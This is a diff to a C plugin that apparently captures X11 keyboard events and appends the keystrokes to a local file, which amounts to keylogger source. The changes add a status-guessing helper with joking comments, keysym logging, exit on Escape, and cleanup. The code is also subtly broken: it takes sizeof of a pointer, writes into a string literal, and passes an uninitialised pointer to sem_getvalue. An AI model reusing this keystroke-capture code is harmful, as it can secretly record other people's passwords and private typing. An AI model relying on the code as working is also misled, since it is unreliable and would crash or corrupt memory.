@@ -4,6 +4,8 @@
 #include <unistd.h>
 #include <X11/Xlib.h>
 #include <X11/keysym.h>
+#include <X11/Xutil.h>
+#include <X11/Xos.h>
 #include <semaphore.h>
 #include <sys/types.h>
 #include <sys/wait.h>
@@ -20,9 +22,26 @@
  * Auxiliar functions
  */
 
+/**
+ * Okay, I know, maybe not the best solution but if I dont do this I have to either parse a vewwy
+ * compwicated howwibwe pionter or change the XLookupString function to another one that uses ic and 
+ * thats scawwy
+ */
+void check_status(Status * s, KeySym k, char * b){
+	
+	if(strcmp(b, "") != 0 && k == NoSymbol){
+		*s = XLookupChars;
+	}
+	else if(strcmp(b, "") != 0 && k != NoSymbol){
+		*s = XLookupBoth;
+	}
+	else if(strcmp(b, "") == 0 && k != NoSymbol){
+		*s = XLookupKeySym;
+	}
+}
+
 int init_plugin()
 {
-	int flag = 0;
 	char* buffer, *keysym_name;
 	int* val;
 	FILE* f;
@@ -57,7 +76,7 @@ int init_plugin()
 	 * Open the file
 	 */
 
-	f = fopen("logs/temp.bin", "ab");
+	f = fopen("temp.bin", "ab");
 
 	if(f == NULL)
 	{
@@ -76,7 +95,9 @@ int init_plugin()
 
 			// Event to check, buffer where it would be stored, max size, Gets the mod keys(shift
 			// ctrl lock), if 0 does not do anything
-			XLookupString(&event.xkey, &buffer, sizeof(buffer), &symb, &status);
+			XLookupString(&event.xkey, buffer, sizeof(buffer), &symb, 0);
+
+			check_status(&status, symb ,buffer);
 
 			switch(status){
 				case XLookupChars:
@@ -91,15 +112,26 @@ int init_plugin()
 					break;
 				case XLookupKeySym:
 					//Do nothing, probably
-					DEBUG_PRINT((P_INFO"%s Keysym was taken from keyboard event"));
+					keysym_name = XKeysymToString(symb);
+					DEBUG_PRINT((P_INFO"%s Keysym was taken from keyboard event", keysym_name));
 					break;
 				default:
 					DEBUG_PRINT((P_INFO"Something weird happened on their end but could be our end"));
 			}
+
+			if(symb == XK_Escape)
+				sem_wait(close_sem);
 		}
+
+		symb = NoSymbol;
+		buffer = "";
 		sem_getvalue(close_sem, val);
 	}
 
+	sem_close(close_sem);
+	sem_unlink(SEM);
+	XCloseDisplay(dply);
+	fclose(f);
 	return OK;
 }
 
